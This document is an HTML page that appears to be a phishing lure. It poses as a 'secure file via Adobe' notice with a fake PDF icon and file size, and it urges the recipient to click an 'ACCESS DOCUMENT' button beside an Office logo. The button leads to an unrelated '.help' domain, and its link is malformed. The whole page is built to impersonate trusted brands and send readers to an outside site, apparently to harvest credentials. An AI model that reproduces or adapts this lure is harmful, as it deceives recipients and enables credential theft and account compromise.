<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure File via Adobe</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: #ffffff;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 40px 24px;
    }

    .container {
      max-width: 560px;
      width: 100%;
      text-align: center;
    }

    .title {
      font-size: 28px;
      font-weight: 900;
      color: #111111;
      line-height: 1.3;
      margin-bottom: 36px;
      font-family: Arial, sans-serif;
    }

    .file-row {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 16px;
      margin-bottom: 32px;
    }

    /* PDF icon via inline SVG */
    .pdf-icon { width: 52px; height: 64px; }

    .file-size {
      font-size: 38px;
      font-weight: 300;
      color: #222222;
      letter-spacing: -1px;
    }

    .instruction {
      font-size: 17px;
      font-weight: 700;
      color: #111111;
      line-height: 1.6;
      margin-bottom: 36px;
    }

    .btn-row {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .btn {
      display: inline-block;
      background: #0000ff;
      color: #ffffff;
      font-family: 'Arial Black', Arial, sans-serif;
      font-size: 24px;
      font-weight: 900;
      text-decoration: underline;
      padding: 6px 18px;
      letter-spacing: 0.5px;
      cursor: pointer;
    }

    .btn:hover { background: #0000cc; }

    .office-icon { width: 26px; height: 26px; flex-shrink: 0; }
  </style>
</head>
<body>
  <div class="container">

    <p class="title">You've received a securefile Via Adobe.</p>

    <div class="file-row">
      <!-- PDF Icon -->
      <svg class="pdf-icon" viewBox="0 0 52 64" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="1" y="1" width="42" height="54" rx="2" fill="#f5f0eb" stroke="#c8b8a0" stroke-width="1.5"/>
        <path d="M33 1 L43 11 L33 11 Z" fill="#e0d4c0"/>
        <rect x="0" y="36" width="44" height="16" rx="1" fill="#9b3a1a"/>
        <text x="22" y="48" text-anchor="middle" fill="white" font-size="9" font-family="Arial, sans-serif" font-weight="bold">pdf</text>
        <line x1="8" y1="18" x2="34" y2="18" stroke="#c8b8a0" stroke-width="1.2"/>
        <line x1="8" y1="24" x2="34" y2="24" stroke="#c8b8a0" stroke-width="1.2"/>
        <line x1="8" y1="30" x2="26" y2="30" stroke="#c8b8a0" stroke-width="1.2"/>
      </svg>
      <span class="file-size">56.1KB</span>
    </div>

    <p class="instruction">
      To receive and download this PDF file,<br>
      Click the access document below.
    </p>

    <div class="btn-row">
      <a class="btn"
         href="https://https://arcomplianceservices.help"
         target="_blank"
         rel="noopener noreferrer">
        ACCESS DOCUMENT
      </a>
      <!-- Office icon -->
      <svg class="office-icon" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="1" y="1" width="20" height="20" rx="3" fill="#D83B01"/>
        <text x="11" y="16" text-anchor="middle" fill="white" font-size="13" font-family="Arial, sans-serif" font-weight="bold">O</text>
      </svg>
    </div>

  </div>
</body>
</html>
